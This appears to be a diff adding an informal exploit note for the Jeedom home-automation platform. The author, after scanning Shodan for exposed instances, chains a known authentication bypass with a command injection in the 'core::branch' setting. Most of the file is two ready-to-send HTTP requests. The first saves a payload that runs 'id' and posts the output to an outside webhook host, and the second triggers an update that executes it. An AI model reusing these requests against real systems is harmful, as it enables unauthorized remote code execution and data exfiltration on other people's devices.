@@ -1,0 +1,57 @@
+random sunday shodan safari, i find some jeedom instances and this papier about a recent auth bypass:
+(https://www.synacktiv.com/sites/default/files/2021-10/advisory_Jeedom_Auth_Bypass_CVE-2021-42557.pdf) 
+
+
+they say you can reach RCE via legit features if you can find the http_password in the response of "jeeObject::full" call, but from my scans the password from the web interface is very rarely in there :(
+
+so i decided to find another way to RCE after the auth bypass and here we are..
+
+there a command injection in the "core::branch" parameter, you can save the payload in the config and trigger an update to execute the command
+
+GET /core/api/jeeApi.php HTTP/1.1
+Host: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://xxx/index.php?v=d
+Cookie: PHPSESSID=xxx
+Content-Length: 262
+
+{
+ "jsonrpc":"2.0",
+ "method":"config::save",
+ "params":{
+"key":"core::branch",
+"value":"$(curl -X POST https://webhook.site/xxx -d $(id))",
+"apikey":0,
+ "api":0,
+ "proapi":0
+ }
+}
+
+GET /core/api/jeeApi.php HTTP/1.1
+Host: xxx
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+Accept: image/avif,image/webp,*/*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://xxxx/index.php?v=d
+Cookie: PHPSESSID=xxxx
+Content-Length: 188
+
+{
+ "jsonrpc":"2.0",
+ "method":"jeedom::update",
+ "params":{
+
+"apikey":0,
+ "api":0,
+ "proapi":0
+ }
+}
+
+
+
